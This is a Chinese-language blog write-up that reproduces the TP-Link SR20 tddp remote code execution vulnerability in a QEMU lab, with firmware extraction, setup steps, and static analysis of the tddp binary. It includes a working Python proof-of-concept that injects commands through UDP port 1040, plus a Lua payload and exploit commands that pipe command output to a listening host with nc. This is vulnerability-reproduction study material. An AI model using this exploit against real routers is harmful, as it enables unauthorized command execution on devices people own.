---
categories: 漏洞复现
date: 2021-04-26 19:12:58
layout: post
tags: null
title: TPlink SR20远程代码执行漏洞
---

漏洞公布时间：2019年3月26日



## 漏洞原理

参考 https://paper.seebug.org/879/#_5



## 环境搭建

1、ubuntu 16.04



2、Qemu 2.5.0

```python
wget https://download.qemu.org/qemu-3.1.0.tar.xz --no-check-certificate
tar -xvJf qemu-3.1.0.tar.xz
cd qemu-3.1.0/
./configure --target-list=arm-softmmu --audio-drv-list=alsa,pa
[出现错误：alsa check failed，暂时未解决，故此方法搁置。]

apt-get install qemu

root@ubuntu:/home/giantbranch# qemu-arm --version
qemu-arm version 2.5.0 (Debian 1:2.5+dfsg-5ubuntu10.51), Copyright (c) 2003-2008 Fabrice Bellard
```



3、Binwalk

```python
git clone https://github.com/ReFirmLabs/binwalk
cd binwalk
python setup.py install
sudo ./deps.sh $ Debian/Ubuntu
```



## 固件

官网下载 https://www.tp-link.com/us/support/download/sr20/#Firmware

下载最新版 Published Date: 2019-12-17

![fig1Squashfs](/TPlinkSR20_rce/fig1Squashfs.png)

```python
binwalk -Me tpra_sr20v1_us-up-ver1-2-4-P123\[20191212-rel55239\]_2019-12-12_16.21.36.bin
```

得到sashes-root，就是固件的文件系统。



## 复现步骤

1、相关环境（按照文章教程，完整搭建ARM QEMU虚拟机环境。）

将如下三个文件放在同一个文件中

```python
debian_wheezy_armhf_standard.qcow2
initrd.img-3.2.0-4-vexpress
vmlinuz-3.2.0-4-vexpress
```

执行 如下命令

```python
apt install uml-utilities
tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 10.10.10.1/24
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

登陆：root/root



ubuntu配置网卡IP：ifconfig eth0 10.10.10.2/24



使用SimpleHTTPServer传递固件



使用chroot切换根目录固件文件系统

```python
mount -o bind /dev ./H*-TP-Link_SR20/dev/
mount -t proc /proc/ ./H4lo-TP-Link_SR20/proc/
chroot H*-TP-Link_SR20 sh
```

![fig2arm](/TPlinkSR20_rce/fig2arm.jpg)



在宿主机安装 atftpd 搭建 TFTP 服务

```python
apt install atftpd
编辑/etc/default/atftpd文件 【具体见参考文章】
sudo systemctl start atftpd
sudo systemctl status atftpd
```

![fig3atftpd](/TPlinkSR20_rce/fig3atftpd.jpg)



2、根目录创建/tftpboot文件

```python
mkdir /tftpboot
chmod 777 /tftpboot/
cd /tftpboot
touch payload
```

payload写入如下内容

```python
function config_test(config)
  os.execute("id | nc 10.10.10.1 1337")
end
```



3、qemu虚拟机中启动tddp程序

```
qemu-arm -L . ./usr/bin/tddp
```

执行这个没反应，直接./tddp也没反应。后来发现，是第一个点需要变成./ 就能成功。

 

进入别人发我的H*-TP-Link_SR20文件夹，执行以下任意一条即可启动tddp。

```python
./qemu-arm-static -L ./ ./usr/bin/tddp
qemu-arm -L ./ ./usr/bin/tddp
```



但是此时是在qemu中的，所以直接./即可执行

![fig9-tddp](/TPlinkSR20_rce/fig9-tddp.jpg)



4、宿主NC监听，且宿主执行POC

结果如下：

![fig10-res](/TPlinkSR20_rce/fig10-res.png)

有错误，是在调用Lua API的时候出错了，我太菜了不懂原理，先不用这种了，用另一种方法。



1、虚拟机root用户

```python
tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 10.10.10.1/24
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

登陆：root/root



qemu配置网卡IP：ifconfig eth0 10.10.10.2/24



使用chroot切换根目录固件文件系统

```python
mount -o bind /dev ./H4lo-TP-Link_SR20/dev/
mount -t proc /proc/ ./H4lo-TP-Link_SR20/proc/
chroot H4lo-TP-Link_SR20 sh
```



在宿主机查看atftpd 状态

```python
sudo systemctl status atftpd
```



2、qemu虚拟机中启动tddp程序

```python
./usr/bin/tddp
```



3、虚拟机nmap扫描

最开始扫描不出来，后来发现，我上面的ip设置的是10.10.10.2，扫描的时候写的ip是10.0.0.2......

```python
nmap -p 1040 -sU 10.10.10.2
```

![fig11-nmap](/TPlinkSR20_rce/fig11-nmap.jpg)



4、运行exp

虚拟机运行：`python exp.py 10.10.10.2 date`

出现如下错误

```python
root@ubuntu:/home/giantbranch/CVE/TPlinkSR20# python exp.py 10.10.10.2 date
Traceback (most recent call last):
  File "exp.py", line 15, in <module>
    payload = 'x01x31'.ljust(12,'x00')
TypeError: ljust() argument 2 must be char, not str
```

这是因为别的大佬在发布文章的时候，反斜杠 \ 这个字符被网页过滤了，再加上就好。payload如下：

![fig12-payload](/TPlinkSR20_rce/fig12-payload.jpg)



命令成功执行结果如下：

![fig13-res_date](/TPlinkSR20_rce/fig13-res_date.jpg)



5、NC回显结果

宿主机监听7890端口：`nc -nvl 10.10.10.1 7890`

qemu打开tddp：`./usr/bin/tddp`

宿主机执行exp：`python exp.py 10.10.10.2 "ifconfig|nc 10.10.10.1 7890"`

结果如下![fig14-res-nc](/TPlinkSR20_rce/fig14-res-nc.jpg)

右下角输出的是命令ifconfig的内容。



poc如下

```python
from pwn import *
from socket import *
import sys

tddp_port = 1040
recv_port = 12345
ip = sys.argv[1]
command = sys.argv[2]

s_send = socket(AF_INET,SOCK_DGRAM,0)
s_recv = socket(AF_INET,SOCK_DGRAM,0)

s_recv.bind(('',12345))

payload = '\x01\x31'.ljust(12,'\x00')	#01表示版本号，31是用来触发漏洞的，12是用来填充的，需要后面填充12个字符。
payload += "123|%s&&echo ;123"%(command) #；是用来分割的，后面的123是为了让分割之后后半部分不为空，可以看成是填充的。

s_send.sendto(payload,(ip,tddp_port))
s_send.close()

res,addr = s_recv.recvfrom(1024)
print res
```



## 静态分析

32位打开tddp文件，参考https://blog.csdn.net/weixin_43815930/article/details/107601747，先从recvfrom函数开始。发现sub_16418调用了这个函数。调用语句如下：

```python
v14 = recvfrom(a1[9], (char *)a1 + 45083, 0xAFC8u, 0, &addr, &addr_len);
```

下面还有判断协议版本的

![fig4](/TPlinkSR20_rce/fig4.jpg)



sub_936c调用了sub_16418，查看sub_936c内容如下，根据其输出内容以及setsockopt函数，判断其为主函数。

![fig5](/TPlinkSR20_rce/fig5.jpg)



刚才的sub_16418函数的recvfrom下面调用了sub_15E74函数。它会对传入的多个值进行比较，根据前置知识，知道了漏洞出现在case 0x31的位置。

![fig6-0x31](/TPlinkSR20_rce/fig6-0x31.jpg)



跟随其进入sub_A580处。

![fig7-scanf](/TPlinkSR20_rce/fig7-scanf.jpg)



随后有语句`v16 = inet_ntoa(*(struct in_addr *)(a1 + 4));`将传入的内容变成IP地址的格式，

随后调用sub_91DC函数。这里的cd /tmp很可疑，可能会存在指令注入。

![fig8-cmd](/TPlinkSR20_rce/fig8-cmd.jpg)

漏洞就是在这个tftp位置处。`如果我们在我们的攻击机上配置一个atftp服务，并且向TP-Link SR20的1040端口传输一个第二个字节数据为0x31的tddp数据包，那这个路由器就会从我们的攻击机上下载文件。`



[这篇文章](https://x1ng.top/2020/10/18/TP-Link-sr20远程命令执行) 先从cmd开始找起，也是可以的。



## 收获

1、socket接收的内容是我们可控的

2、传输的时候第一个字节代表的应该是版本号，一般设定的都是1。设定为1，参数后移12位；如果设定成其他的，参数后移28位。



参考：

[静态分析-CSDN-byAnansi_safe](https://blog.csdn.net/weixin_43815930)

[完整分析-seebug-by知道创宇xax007](https://paper.seebug.org/879/#_5)

[完整分析-个人博客-byX1ng](https://x1ng.top/2020/10/18/TP-Link-sr20远程命令执行/)

[完整分析-安全客-byH4lo](https://www.anquanke.com/post/id/183202)

[一个更高层面的分析-by国外研究员](https://www.anquanke.com/post/id/84991)